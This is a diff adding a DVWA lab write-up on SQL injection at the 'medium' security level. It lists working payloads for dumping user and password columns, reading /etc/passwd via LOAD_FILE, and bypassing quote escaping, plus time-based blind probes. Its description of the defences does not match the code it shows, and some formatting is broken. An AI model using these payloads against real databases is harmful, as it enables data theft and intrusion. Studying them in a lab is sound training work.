@@ -1,0 +1,82 @@
+
+## **📂 DVWA/SQL-Injection/medium-security.md**
+```markdown
+# 🛡️ Medium Security - SQL Injection
+
+## 🎯 Target Application
+User ID lookup with basic input sanitization (magic quotes).
+
+## 🔧 Security Analysis
+Medium level implements:
+- **Magic Quotes:** `'` becomes `\'`
+- **Numeric Validation:** `intval()` function
+- **But:** Still vulnerable to numeric SQLi
+
+## ⚡ Bypass Techniques
+
+### 1. Numeric SQL Injection (No Quotes Needed)
+
+Input: 1 OR 1=1
+Query: SELECT ... WHERE user_id = 1 OR 1=1
+Result: All users displayed
+
+
+### 2. Bypass Magic Quotes with Hexadecimal
+
+Input: 1 UNION SELECT 1,LOAD_FILE(0x2F6574632F706173737764)
+Hex Decoded: /etc/passwd
+Result: System file contents
+
+
+### 3. Using Comments to Bypass
+
+Input: 1/comment/OR/comment/1=1
+Result: Bypasses simple keyword filters
+
+
+## 🔍 Exploitation Steps
+
+### Step 1: Test Numeric InjectionInput: 1 OR 1=1
+Observations: Returns multiple users → Vulnerable
+
+
+### Step 2: Union Attack with Numeric Columns
+
+Input: 1 UNION SELECT 1,2
+Result: Columns 1 and 2 displayed
+
+Input: 1 UNION SELECT @@version,database()
+Result: Version and database name
+
+
+### Step 3: Extract Data Without Quotes
+```sql
+-- Using CHAR() function instead of quotes
+1 UNION SELECT 1,CHAR(117,115,101,114)  -- 'user' in ASCII
+
+-- Using CONCAT with numbers
+1 UNION SELECT 1,CONCAT(0x75,0x73,0x65,0x72)  -- Hex for 'user'
+
+Payload Examples
+
+-- Basic numeric injection
+1 OR 1=1
+1 OR TRUE
+1 OR 1
+
+-- Union attacks (no quotes)
+1 UNION SELECT @@version,database()
+1 UNION SELECT user,password FROM users
+
+-- Blind injection (if UNION blocked)
+1 AND SUBSTRING(@@version,1,1)=5
+1 AND SLEEP(5)  -- Time-based
+
+
+Code Analysis
+
+// DVWA Medium Security (still vulnerable)
+$id = $_GET['id'];
+$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
+// But uses: WHERE user_id = $id (no quotes in query!)
+
